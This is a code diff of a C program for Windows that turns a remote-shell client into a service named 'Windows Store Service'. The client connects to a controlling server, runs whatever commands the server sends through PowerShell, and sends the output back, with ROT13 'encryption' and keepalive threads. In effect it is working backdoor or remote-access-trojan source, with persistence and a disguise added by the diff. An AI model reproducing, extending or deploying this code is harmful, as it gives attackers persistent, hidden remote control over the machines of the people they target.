@@ -7,6 +7,12 @@
 #pragma comment(lib,"ws2_32.lib")
 #define _CRT_SECURE_NO_WARNINGS
 
+SERVICE_STATUS ServiceStatus;
+SERVICE_STATUS_HANDLE hStatus;
+
+void ServiceMain(DWORD argc, LPTSTR* argv);
+void ControlHandler(DWORD request);
+
 static void encrypt(char* plainText) {
     // This function takes a pointer to a string, and rotates the characters by 13
     // Because the Ceaser Cipher we are using is 13 characters, the same cipher can be applied
@@ -47,6 +53,48 @@ unsigned __stdcall sendKeepAlive(SOCKET* clientSocket) {
 }
 
 int main(void) {
+    // Connect main thread to the service control messanger
+    SERVICE_TABLE_ENTRY ServiceTable[] = {
+        {(LPWSTR)TEXT("Windows Store Service"), (LPSERVICE_MAIN_FUNCTION)ServiceMain},
+        {NULL, NULL}
+    };
+
+    if (!StartServiceCtrlDispatcher(ServiceTable)) {
+        printf("Failed to Start Service\n");
+    }
+
+    return 0;
+}
+
+void ServiceMain(DWORD argc, LPTSTR* argv) {
+    hStatus = RegisterServiceCtrlHandler(TEXT("MyService"), (LPHANDLER_FUNCTION)ControlHandler);
+    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
+        // Handle error
+        return;
+    }
+
+    // Initialize service status
+    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
+    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    ServiceStatus.dwWin32ExitCode = 0;
+    ServiceStatus.dwServiceSpecificExitCode = 0;
+    ServiceStatus.dwCheckPoint = 0;
+    ServiceStatus.dwWaitHint = 0;
+
+    // Report initial status to SCM
+    SetServiceStatus(hStatus, &ServiceStatus);
+
+    // Service initialization code here
+
+    // Report running status when initialization is complete
+    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+    SetServiceStatus(hStatus, &ServiceStatus);
+
+    /////////////////////////////////////
+    //   START OF NON-SERVICE CODE     //
+    /////////////////////////////////////
+
     // Initialize the Socket, and server address variables
     WSADATA sockData;
     SOCKET clientSocket;
@@ -81,7 +129,7 @@ int main(void) {
         printf("Error Code: %d\n", error);
         exit(error);
     }
-    
+
     // The first message sent to the Server is the OS
     const char* osMessage = "Windows\n";
     send(clientSocket, osMessage, strnlen(osMessage, 8), 0);
@@ -132,7 +180,8 @@ int main(void) {
     // Start a thread to send a keep alive message every 30 seconds to the Server
     HANDLE thread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);
 
-    while (1) {
+    // Main service loop
+    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
         // Get message from Server
         int bytesRead = recv(clientSocket, serverMessage, 1023, 0);
         serverMessage[bytesRead] = '\0';
@@ -154,7 +203,7 @@ int main(void) {
             char command[1100] = "Powershell.exe -Command \"";
             strcat_s(command, rsize_t(1100), serverMessage);
             strcat_s(command, rsize_t(1100), "\"");
-                
+
             // Create variables to run and store command output
             char commandOutput[8192];
             FILE* pipe;
@@ -163,7 +212,6 @@ int main(void) {
             pipe = _popen(command, "r");
             if (pipe == NULL) {
                 printf("Error opening pipe.\n");
-                return 1;
             }
 
             // Read the output a line and send it back to the Server
@@ -192,8 +240,29 @@ int main(void) {
         }
     }
 
-    // Close client socket
+    // Cleanup and shutdown
     closesocket(clientSocket);
+    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+    SetServiceStatus(hStatus, &ServiceStatus);
+}
 
-    return 0;
+void ControlHandler(DWORD request) {
+    switch (request) {
+    case SERVICE_CONTROL_STOP:
+        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+        SetServiceStatus(hStatus, &ServiceStatus);
+
+        // Perform cleanup tasks
+
+        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+        SetServiceStatus(hStatus, &ServiceStatus);
+        return;
+
+    case SERVICE_CONTROL_SHUTDOWN:
+        // Handle shutdown tasks
+        break;
+
+    default:
+        break;
+    }
 }
